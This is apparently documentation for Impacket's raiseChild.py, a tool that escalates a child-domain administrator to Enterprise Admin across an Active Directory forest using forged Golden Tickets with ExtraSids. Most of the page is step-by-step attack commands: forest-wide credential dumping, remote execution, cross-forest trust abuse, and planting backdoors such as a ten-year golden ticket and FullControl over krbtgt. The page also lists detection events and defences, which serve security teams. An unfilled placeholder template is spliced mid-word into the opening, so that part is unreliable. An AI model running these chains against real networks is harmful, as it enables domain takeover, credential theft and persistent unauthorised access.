# raiseChild.py

## Overview
`raiseChild.py` implements a child-domain to forest privilege escalation attack that elevates privileges from a child domain administrator to Enterprise Admin in the forest root. This tool automates the complete attack chain using Golden Tickets with ExtraSids to achieve forest-wide compromise.

## Detailed Description
This script implements a sophisticated privilege escalation attack that exploits the trust relationship between child domains and the forest root. The attack leverages the concept of Golden Tickets with ExtraSids, as researched by Benjamin Delpy (@gentilkiwi) and documented by Sean Metcalf (@PyroTek3). The tool automates the entire process from child domain admin to Enterprise Admin privileges.

The attack works by:
1. Obtaining child domain krbtgt credentials via DCSync
2. Creating a Golden Ticket with Enterprise Admin SID in ExtraSids
3. Using the forged ticket to access forest resources
4. Optionally executing commands with Enterprise Admin privileges

This represents one of the most powerful privilege escalation attacks in Active Directory environments, as it allows complete forest compromise from any child domain administrator account.

### Key Features:
- **Automated Privilege Escalation**: Complete child-to-forest escalation automation
- **Golden Ticket Creation**: Generates tickets with Enterprise Admin privileges
- **ExtraSids Abuse**: Leverages SID history for privilege escalation
- **Forest Discovery**: Automatically discovers forest structure and resources
- **PSExec Integration**: Optional remote command execution with elevated privileges
- **Ticket Persistence**: Save golden tickets for future use

### Technical Details:
- Uses MS-NRPC for domain controller discovery and forest information
- Leverages MS-LSAT for Enterprise Admin SID retrieval
- Implements MS-DRSR for krbtgt credential extraction
- Creates Kerberos tickets with forged PAC and ExtraSids
- Supports multiple authentication methods and target specificationOverview
`raiseChild.py` is a child to parent domain privilege escalation tool in the Impacket suite. This tool is categorized under Privilege Escalation and provides functionality for [specific use case].

## Detailed Description
[Detailed description of what this tool does, its purpose, and technical background]

### Key Features:
- **Feature 1**: Description of primary feature
- **Feature 2**: Description of secondary feature
- **Feature 3**: Description of additional feature
- **Multiple Authentication**: Support for password, hash, and Kerberos authentication
- **Cross-Platform Compatibility**: Works with various Windows versions

### Technical Details:
- Uses [specific protocol/technique]
- Leverages [specific Windows API/service]
- Implements [specific attack technique]
- Compatible with [specific versions/systems]

## Command Line Options

```
usage: raiseChild.py [-h] [-ts] [-debug] [-w pathname] [-target-exec target address] [-targetRID RID]
                     [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                     target

Privilege Escalation from a child domain up to its forest

Required Arguments:
  target                domain/username[:password] (domain MUST be FQDN)

Output Options:
  -w pathname           Writes the golden ticket in CCache format into the <pathname> file
  -target-exec target address
                        Target host to PSEXEC against with Enterprise Admin privileges
  -targetRID RID        Target user RID to dump credentials (default: 500 - Administrator)

General Options:
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key for Kerberos Authentication (128 or 256 bits)
```
## Usage Examples

### Basic Forest Privilege Escalation
```bash
# Basic escalation with password prompt
python3 raiseChild.py child.domain.local/admin

# With explicit password
python3 raiseChild.py child.domain.local/admin:password123

# Using NTLM hash authentication
python3 raiseChild.py -hashes :ntlmhash child.domain.local/admin

# Using Kerberos authentication
python3 raiseChild.py -k child.domain.local/admin
```

### Golden Ticket Generation and Storage
```bash
# Generate and save golden ticket for later use
python3 raiseChild.py -w forest_admin.ccache child.domain.local/admin:password

# Use saved ticket for forest access
export KRB5CCNAME=forest_admin.ccache
python3 secretsdump.py -k -no-pass forest.local/admin@forestdc.forest.local
```

### Remote Execution with Enterprise Admin
```bash
# Escalate and execute commands on forest resources
python3 raiseChild.py -target-exec forestdc.forest.local child.domain.local/admin:password

# Target specific host in forest
python3 raiseChild.py -target-exec server.forest.local child.domain.local/admin:password

# Execute with specific user RID (custom Enterprise Admin)
python3 raiseChild.py -target-exec forestdc.forest.local -targetRID 1101 child.domain.local/admin:password
```

### Advanced Usage Examples
```bash
# Full attack with ticket saving and remote execution
python3 raiseChild.py -w ea_ticket.ccache -target-exec forestdc.forest.local child.domain.local/admin:password

# Debug mode for troubleshooting
python3 raiseChild.py -debug child.domain.local/admin:password

# With timestamps for logging
python3 raiseChild.py -ts -target-exec forestdc.forest.local child.domain.local/admin:password

# Using AES key for authentication
python3 raiseChild.py -aesKey aes256key child.domain.local/admin -target-exec forestdc.forest.local
```

### Multi-Step Usage Pattern
```bash
# Step 1: Generate golden ticket
python3 raiseChild.py -w enterprise_admin.ccache child.domain.local/admin:password

# Step 2: Use ticket for forest-wide credential extraction
export KRB5CCNAME=enterprise_admin.ccache
python3 secretsdump.py -k -no-pass forest.local/admin@forestdc.forest.local -just-dc

# Step 3: Access other forest resources
python3 psexec.py -k -no-pass forest.local/admin@server1.forest.local
python3 psexec.py -k -no-pass forest.local/admin@server2.forest.local
```

## Attack Chain Integration

### Complete Forest Compromise
```bash
# Step 1: Gain child domain admin (via other attacks)
python3 secretsdump.py child.domain.local/user:password@childdc.child.domain.local

# Step 2: Use child admin for forest escalation
python3 raiseChild.py -w forest_ticket.ccache child.domain.local/admin:extractedpass

# Step 3: Extract all forest credentials
export KRB5CCNAME=forest_ticket.ccache
python3 secretsdump.py -k -no-pass forest.local/admin@forestdc.forest.local -just-dc
```

### Multi-Domain Forest Takeover
```bash
# Step 1: Escalate from child to forest root
python3 raiseChild.py -w ea_ticket.ccache child1.forest.local/admin:password

# Step 2: Use Enterprise Admin to access all child domains
export KRB5CCNAME=ea_ticket.ccache
python3 secretsdump.py -k -no-pass forest.local/admin@child2dc.child2.forest.local
python3 secretsdump.py -k -no-pass forest.local/admin@child3dc.child3.forest.local

# Step 3: Deploy persistence across all domains
python3 psexec.py -k -no-pass forest.local/admin@forestdc.forest.local
```

### Cross-Forest Trust Abuse
```bash
# Step 1: Escalate to Enterprise Admin in first forest
python3 raiseChild.py -w forest1_ea.ccache child.forest1.local/admin:password

# Step 2: Enumerate trusts to other forests
export KRB5CCNAME=forest1_ea.ccache
python3 findDelegation.py -k -no-pass forest1.local/admin@forestdc.forest1.local

# Step 3: Abuse trusts for cross-forest access
python3 getST.py -k -no-pass forest1.local/admin -spn krbtgt/forest2.local
```

### Persistence Through Multiple Vectors
```bash
# Step 1: Perform initial escalation
python3 raiseChild.py -w persistence.ccache child.domain.local/admin:password

# Step 2: Create multiple persistence mechanisms
export KRB5CCNAME=persistence.ccache
# Create golden ticket with longer validity
python3 ticketer.py -nthash [krbtgt_hash] -domain-sid S-1-5-21-forest -domain forest.local -duration 87600 backdoor

# Step 3: Establish additional backdoors
python3 dacledit.py -k -no-pass forest.local/admin -action write -target krbtgt -principal backdoor -rights FullControl
```

## Prerequisites
- Python 3.x with Impacket installed
- Child domain administrator credentials
- Network access to child domain controller
- DNS resolution capability for all domains in the forest
- Understanding of Active Directory forest/domain trust relationships
- Knowledge of target forest structure

## Attack Workflow Detail

The tool follows this automated sequence:

1. **Domain Controller Discovery**: Locates child domain controller via MS-NRPC
2. **Forest Information**: Discovers forest FQDN and structure
3. **Enterprise Admin SID**: Retrieves Enterprise Admin SID via MS-LSAT
4. **Krbtgt Extraction**: Gets child domain krbtgt credentials via MS-DRSR (DCSync)
5. **Golden Ticket Creation**: Forges ticket with Enterprise Admin SID in ExtraSids
6. **Forest Access**: Uses ticket to access forest resources
7. **Credential Extraction**: Optionally extracts target user credentials
8. **Remote Execution**: Optionally executes commands with Enterprise Admin privileges

## Detection Considerations
- **Event IDs**:
  - 4624: Account logon with Enterprise Admin privileges
  - 4672: Special privileges assigned (Enterprise Admin)
  - 4768: Kerberos TGT request with unusual ExtraSids
  - 4769: Kerberos service ticket requests across forest
  - 5136: Directory service object modified (DCSync indicators)
- **Network Indicators**:
  - Cross-domain authentication patterns
  - DCSync replication requests from non-DC systems
  - Kerberos tickets with ExtraSids from child domains
- **Behavioral Patterns**:
  - Child domain admin suddenly accessing forest resources
  - Enterprise Admin activity from child domain sources
  - Golden ticket indicators (unusual ticket lifetimes, encryption)

## Defensive Measures
- **Forest Hardening**:
  - Implement SID filtering between domains (if possible)
  - Monitor Enterprise Admin group membership
  - Deploy advanced Kerberos monitoring
- **Child Domain Security**:
  - Protect child domain admin accounts with MFA
  - Implement privileged access workstations (PAWs)
  - Regular rotation of krbtgt passwords
- **Detection and Monitoring**:
  - Deploy behavioral analysis for cross-domain access
  - Monitor DCSync operations from non-DC systems
  - Implement ExtraSids detection mechanisms
- **Trust Relationship Management**:
  - Regular review of forest trust relationships
  - Implement least privilege across domain boundaries
  - Consider forest isolation for highly sensitive domains

## Common Issues and Troubleshooting

### DNS Resolution Issues
```bash
# Error: Cannot resolve forest domains
# Solution: Configure DNS to resolve all forest domains
echo "192.168.1.10 forestdc.forest.local forest.local" >> /etc/hosts
# Or configure DNS server with forest zones
```

### Access Denied During DCSync
```bash
# Error: "Access denied" during credential extraction
# Solution: Ensure child domain admin has replication rights
# Verify account is member of Domain Admins or has DCSync permissions
python3 raiseChild.py -debug child.domain.local/admin:password
```

### Kerberos Clock Skew
```bash
# Error: "Clock skew too great"
# Solution: Synchronize time with domain controllers
ntpdate forestdc.forest.local
ntpdate childdc.child.domain.local
```

### Network Connectivity Issues
```bash
# Error: Connection timeout to forest DC
# Solution: Verify network access and firewall rules
# Test connectivity to required ports (88, 135, 389, 445)
nmap -p 88,135,389,445 forestdc.forest.local
```

### Invalid Forest Structure
```bash
# Error: "Cannot determine forest structure"
# Solution: Verify forest configuration and trust relationships
# Ensure child domain is properly joined to forest
# Check domain functional levels
```

## Related Tools
- [secretsdump.py](secretsdump.md) - Extract credentials before and after escalation
- [ticketer.py](ticketer.md) - Alternative golden ticket creation
- [psexec.py](psexec.md) - Execute commands with escalated privileges
- [getST.py](getST.md) - Obtain service tickets for forest resources
- [findDelegation.py](findDelegation.md) - Discover delegation relationships
- [dacledit.py](dacledit.md) - Modify permissions for persistence

---

*This documentation is based on the actual source code and functionality of raiseChild.py from Impacket.*
